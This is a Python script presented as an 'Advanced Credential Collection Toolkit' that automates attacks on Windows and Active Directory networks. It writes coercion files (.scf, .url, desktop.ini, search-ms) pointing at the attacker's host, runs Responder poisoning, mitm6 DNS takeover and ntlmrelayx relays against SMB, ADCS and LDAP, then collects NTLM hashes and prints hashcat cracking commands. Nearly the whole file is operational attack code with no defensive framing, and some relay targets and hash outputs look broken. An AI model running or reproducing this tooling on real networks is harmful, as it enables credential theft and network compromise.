#!/usr/bin/env python3

import os
import sys
import time
import json
import shutil
import logging
import argparse
import netifaces
from datetime import datetime
from pathlib import Path
from threading import Thread, Event
from termcolor import colored
from subprocess import Popen, PIPE, run
import signal
import random
import string

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class DirectoryManager:
    """Manages directory structure and file organization"""
    def __init__(self, output_dir):
        self.output_dir = Path(output_dir)
        self.structure = {
            'responder': 'LLMNR/NBT-NS/mDNS Poisoning',
            'smbrelay': 'SMB Relay Attacks',
            'ldaprelay': 'LDAP Relay Attacks',
            'httprelay': 'HTTP Relay Attacks',
            'adcs': 'Active Directory Certificate Services',
            'mitm6': 'IPv6 DNS Takeover',
            'webdav': 'WebDAV Authentication',
            'exchange': 'Exchange Server Attacks',
            'winrm': 'Windows Remote Management',
            'mssql': 'Microsoft SQL Server',
            'mqtt': 'MQTT Protocol',
            'smtp': 'Mail Protocol Attacks',
            'hashes': 'Captured Hashes',
            'logs': 'Attack Logs',
            'coerce': 'Authentication Coercion Files'
        }

    def setup(self):
        """Create directory structure"""
        try:
            # Create main output directory
            self.output_dir.mkdir(parents=True, exist_ok=True)

            # Create subdirectories
            for name, desc in self.structure.items():
                dir_path = self.output_dir / name
                dir_path.mkdir(parents=True, exist_ok=True)
                (dir_path / '.info').write_text(
                    f"Purpose: {desc}\n"
                    f"Created: {datetime.now()}\n"
                )

            # Setup Responder symlink
            responder_logs = Path('/usr/share/responder/logs')
            responder_link = self.output_dir / 'responder'
            
            if responder_logs.exists() and not responder_link.is_symlink():
                if responder_link.exists():
                    shutil.rmtree(responder_link)
                os.symlink(responder_logs, responder_link)

            return True
        except Exception as e:
            logger.error(f"Directory setup error: {e}")
            return False

    def clean_old_files(self):
        """Remove old files except for today's"""
        today = datetime.now().date()
        
        try:
            for dir_path in self.output_dir.glob('**/'):
                if dir_path.is_dir():
                    for file_path in dir_path.glob('*'):
                        if file_path.is_file():
                            file_date = datetime.fromtimestamp(
                                file_path.stat().st_mtime
                            ).date()
                            if file_date != today:
                                file_path.unlink()
        except Exception as e:
            logger.error(f"Error cleaning old files: {e}")

class CoercionFileGenerator:
    """Generates authentication coercion files"""
    def __init__(self, output_dir, server_ip):
        self.output_dir = Path(output_dir) / 'coerce'
        self.server_ip = server_ip

    def generate_files(self):
        """Generate all coercion file types"""
        templates = {
            'search.search-ms': """<?xml version="1.0"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Share Access</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>imageres.dll,-1002</iconReference>
    <templateInfo>
        <folderType>generic</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\\\{server}\\share</url>
    </simpleLocation>
</searchConnectorDescription>""",
            
            'share.scf': """[Shell]
Command=2
IconFile=\\\\{server}\\share\\icon.ico
[Taskbar]
Command=ToggleDesktop""",
            
            'share.url': """[InternetShortcut]
URL=file://{server}/share/
IconFile=\\\\{server}\\share\\icon.ico
IconIndex=1""",
            
            'print.xml': """<?xml version="1.0" encoding="UTF-8"?>
<descendantfonts>
<print>
<properties xmlns="http://schemas.microsoft.com/windows/2006/propertiesschema">
<property name="System.ItemNameDisplay">\\\\{server}\\share\\file</property>
</properties>
</print>
</descendantfonts>""",
            
            'desktop.ini': """[.ShellClassInfo]
IconResource=\\\\{server}\\share\\icon.ico
[ViewState]
Mode=
Vid=
FolderType=Generic"""
        }

        try:
            self.output_dir.mkdir(parents=True, exist_ok=True)
            
            for filename, template in templates.items():
                file_path = self.output_dir / filename
                file_path.write_text(template.format(server=self.server_ip))
                
            logger.info(f"Generated coercion files in {self.output_dir}")
            return True
        except Exception as e:
            logger.error(f"Error generating coercion files: {e}")
            return False

class ProcessManager:
    """Manages process execution and monitoring"""
    def __init__(self):
        self.processes = []
        self.stop_event = Event()

    def run_command(self, cmd, output_dir=None, timeout=None):
        """Execute command with output monitoring"""
        try:
            logger.info(f"Running command: {cmd}")
            
            process = Popen(
                cmd.split(),
                stdout=PIPE,
                stderr=PIPE,
                universal_newlines=True,
                bufsize=1
            )
            
            self.processes.append(process)
            
            # Monitor output in background thread
            def monitor_output():
                while process.poll() is None and not self.stop_event.is_set():
                    output = process.stdout.readline()
                    if output:
                        logger.info(output.strip())
                        if output_dir:
                            self._log_output(output_dir, output)
            
            Thread(target=monitor_output, daemon=True).start()
            
            # Setup timeout if specified
            if timeout:
                def kill_on_timeout():
                    time.sleep(timeout)
                    if process.poll() is None:
                        process.terminate()
                        try:
                            process.wait(timeout=5)
                        except:
                            process.kill()
                
                Thread(target=kill_on_timeout, daemon=True).start()
            
            return process
            
        except Exception as e:
            logger.error(f"Command execution error: {e}")
            return None

    def _log_output(self, output_dir, output):
        """Log command output to file"""
        try:
            log_file = Path(output_dir) / 'command.log'
            with log_file.open('a') as f:
                f.write(f"{datetime.now()}: {output}")
        except Exception as e:
            logger.error(f"Error logging output: {e}")

# Part 2
    def cleanup(self):
        """Clean up all running processes"""
        for process in self.processes:
            try:
                if process.poll() is None:
                    process.terminate()
                    try:
                        process.wait(timeout=5)
                    except:
                        process.kill()
            except Exception as e:
                logger.error(f"Error cleaning up process: {e}")

class AttackManager:
    """Manages execution of all attack techniques"""
    def __init__(self, interface, output_dir):
        self.interface = interface
        self.output_dir = Path(output_dir)
        self.local_ip = self._get_local_ip()
        self.stop_event = Event()
        self.process_mgr = ProcessManager()
        
        # Initialize managers
        self.dir_manager = DirectoryManager(output_dir)
        self.coercion_gen = CoercionFileGenerator(output_dir, self.local_ip)
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _get_local_ip(self):
        try:
            return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
        except Exception as e:
            logger.error(f"Error getting local IP: {e}")
            return "127.0.0.1"

    def _signal_handler(self, signum, frame):
        self.stop_event.set()
        self.cleanup()

    def run_attacks(self):
        """Execute all attack phases"""
        try:
            if not self.dir_manager.setup():
                return False

            self.print_info("Starting automated attack sequence...")
            
            # Generate coercion files
            self.coercion_gen.generate_files()
            
            # Define attack phases
            attack_phases = [
                # LLMNR/NBT-NS Phase
                {
                    'name': "LLMNR/NBT-NS Poisoning",
                    'duration': 300,
                    'commands': [
                        f'responder -I {self.interface} -wrf'
                    ],
                    'output_dir': 'responder'
                },
                
                # SMB Relay Phase
                {
                    'name': "SMB Relay",
                    'duration': 300,
                    'commands': [
                        f'impacket-ntlmrelayx -tf targets.txt -smb2support -socks -t smb://{self.local_ip}'
                    ],
                    'output_dir': 'smbrelay'
                },
                
                # IPv6/DNS Phase
                {
                    'name': "IPv6 DNS Takeover",
                    'duration': 300,
                    'commands': [
                        f'mitm6 -i {self.interface}',
                        f'impacket-ntlmrelayx -6 -wh {self.local_ip} -t smb://{self.local_ip}'
                    ],
                    'output_dir': 'mitm6'
                },
                
                # ADCS Phase
                {
                    'name': "ADCS Attack",
                    'duration': 300,
                    'commands': [
                        f'impacket-ntlmrelayx -tf targets.txt -t http://dc/certsrv/certfnsh.asp -smb2support'
                    ],
                    'output_dir': 'adcs'
                },
                
                # LDAP Relay Phase
                {
                    'name': "LDAP Relay",
                    'duration': 300,
                    'commands': [
                        f'impacket-ntlmrelayx -tf targets.txt -t ldaps://dc -wh attacker-wpad --delegate-access'
                    ],
                    'output_dir': 'ldaprelay'
                }
            ]

            # Execute each attack phase
            for phase in attack_phases:
                if self.stop_event.is_set():
                    break

                self.print_info(f"\nStarting {phase['name']} phase")
                self.print_info(f"Running for {phase['duration']} seconds...")

                # Create phase directory
                phase_dir = self.output_dir / phase['output_dir']
                phase_dir.mkdir(exist_ok=True)

                # Start all commands for this phase
                processes = []
                for cmd in phase['commands']:
                    proc = self.process_mgr.run_command(
                        cmd, 
                        output_dir=phase_dir,
                        timeout=phase['duration']
                    )
                    if proc:
                        processes.append(proc)

                try:
                    # Wait for phase duration
                    time.sleep(phase['duration'])
                except KeyboardInterrupt:
                    self.print_info("\nPhase interrupted by user")
                    break
                finally:
                    # Stop processes from this phase
                    for proc in processes:
                        if proc.poll() is None:
                            proc.terminate()
                            try:
                                proc.wait(timeout=5)
                            except:
                                proc.kill()

                # Extract hashes after each phase
                self.extract_hashes()
                self.print_good(f"Completed {phase['name']} phase")

            return True

        except Exception as e:
            self.print_bad(f"Error in attack sequence: {str(e)}")
            return False

    def extract_hashes(self):
        """Extract and organize captured hashes"""
        try:
            hash_dir = self.output_dir / 'hashes'
            hash_dir.mkdir(exist_ok=True)

            # Define hash types to extract
            hash_types = {
                'ntlmv1': hash_dir / 'ntlmv1.txt',
                'ntlmv2': hash_dir / 'ntlmv2.txt',
                'netntlm': hash_dir / 'netntlm.txt',
                'krb5tgs': hash_dir / 'krb5tgs.txt',
                'cleartext': hash_dir / 'cleartext.txt'
            }

            # Clear/create hash files
            for f in hash_types.values():
                f.write_text('')

            # Process Responder logs
            responder_dir = self.output_dir / 'responder'
            if responder_dir.exists():
                for hash_file in responder_dir.glob('*-NTLMv*-*.txt'):
                    content = hash_file.read_text().strip()
                    if content:
                        if 'NTLMv2' in hash_file.name:
                            hash_types['ntlmv2'].write_text(
                                hash_types['ntlmv2'].read_text() + content + '\n'
                            )
                        elif 'NTLMv1' in hash_file.name:
                            hash_types['ntlmv1'].write_text(
                                hash_types['ntlmv1'].read_text() + content + '\n'
                            )

            # Generate hash summary
            summary = hash_dir / 'summary.txt'
            with summary.open('w') as f:
                f.write("Hash Collection Summary\n")
                f.write("=====================\n\n")
                
                for hash_type, file_path in hash_types.items():
                    count = len([line for line in file_path.read_text().splitlines() if line.strip()])
                    f.write(f"{hash_type}: {count} hashes\n")
                
                f.write("\nHashcat Commands:\n")
                f.write("================\n")
                f.write(f"NTLMv1: hashcat -m 5500 {hash_types['ntlmv1']} wordlist.txt\n")
                f.write(f"NTLMv2: hashcat -m 5600 {hash_types['ntlmv2']} wordlist.txt\n")
                f.write(f"NetNTLM: hashcat -m 5500 {hash_types['netntlm']} wordlist.txt\n")
                f.write(f"Kerberos TGS: hashcat -m 13100 {hash_types['krb5tgs']} wordlist.txt\n")

        except Exception as e:
            self.print_bad(f"Error extracting hashes: {str(e)}")

    def cleanup(self):
        """Cleanup attack resources"""
        self.print_info("Cleaning up...")
        self.process_mgr.cleanup()
        self.extract_hashes()

    # Utility print functions
    def print_info(self, msg): print(colored('[*] ' + msg, 'blue'))
    def print_good(self, msg): print(colored('[+] ' + msg, 'green'))
    def print_bad(self, msg): print(colored('[-] ' + msg, 'red'))

def main():
    parser = argparse.ArgumentParser(description="Advanced Credential Collection Toolkit")
    
    # Main options
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--auto", action="store_true", help="Run all attacks sequentially")
    
    args = parser.parse_args()

    # Check root privileges
    if os.geteuid() != 0:
        print(colored("[-] This script must be run as root", 'red'))
        sys.exit(1)

    # Setup logging
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    # Create output directory
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    output_dir = Path(f"output/{timestamp}")

    try:
        attack_mgr = AttackManager(args.interface, output_dir)
        
        if args.auto:
            attack_mgr.run_attacks()
        else:
            parser.print_help()

    except KeyboardInterrupt:
        print(colored("\n[!] Attack interrupted by user", 'yellow'))
    except Exception as e:
        print(colored(f"\n[-] Error: {str(e)}", 'red'))
        if args.verbose:
            import traceback
            traceback.print_exc()
    finally:
        print(colored("\n[*] Cleaning up...", 'blue'))

if __name__ == "__main__":
    main()
